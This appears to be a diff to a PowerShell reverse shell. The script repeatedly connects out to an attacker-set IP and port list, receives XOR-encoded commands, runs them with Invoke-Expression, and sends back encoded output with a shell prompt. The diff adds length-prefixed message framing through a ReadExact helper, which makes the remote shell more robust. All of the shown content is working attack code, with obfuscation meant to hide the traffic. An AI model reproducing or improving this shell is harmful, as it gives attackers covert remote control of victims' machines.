@@ -14,26 +14,52 @@ function XorCrypt([byte[]]$data, [string]$key) {
     return $out
 }
 
+function ReadExact([System.Net.Sockets.NetworkStream]$stream, [int]$count) {
+    # Reads exactly $count bytes — no more, no less
+    $buf = New-Object byte[] $count
+    $total = 0
+    while ($total -lt $count) {
+        $read = $stream.Read($buf, $total, $count - $total)
+        if ($read -eq 0) { return $null }
+        $total += $read
+    }
+    return $buf
+}
+
 while ($true) {
     foreach ($port in $ports) {
         try {
             $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
             $stream = $client.GetStream()
-            [byte[]]$buf = New-Object byte[] 8192
 
             while ($true) {
-                $i = $stream.Read($buf, 0, $buf.Length)
-                if ($i -eq 0) { break }
+                # Read 4-byte length header
+                $lenBytes = ReadExact $stream 4
+                if ($lenBytes -eq $null) { break }
 
-                $decoded  = XorCrypt $buf[0..($i-1)] $xorKey
+                # Convert to int (big-endian)
+                [Array]::Reverse($lenBytes)
+                $msgLen = [BitConverter]::ToUInt32($lenBytes, 0)
+
+                # Read exactly msgLen bytes
+                $encoded = ReadExact $stream $msgLen
+                if ($encoded -eq $null) { break }
+
+                # Decode and execute
+                $decoded  = XorCrypt $encoded $xorKey
                 $command  = [System.Text.Encoding]::UTF8.GetString($decoded).Trim()
-
                 $output   = (iex $command 2>&1 | Out-String)
                 $prompt   = "PS " + (Get-Location).Path + "> "
                 $response = [System.Text.Encoding]::UTF8.GetBytes($output + $prompt)
 
-                $encoded  = XorCrypt $response $xorKey
-                $stream.Write($encoded, 0, $encoded.Length)
+                # XOR encode response
+                $encResp  = XorCrypt $response $xorKey
+
+                # Send 4-byte length prefix + encoded response
+                $respLen  = [BitConverter]::GetBytes([uint32]$encResp.Length)
+                [Array]::Reverse($respLen)
+                $stream.Write($respLen, 0, 4)
+                $stream.Write($encResp, 0, $encResp.Length)
                 $stream.Flush()
             }
             $client.Close()
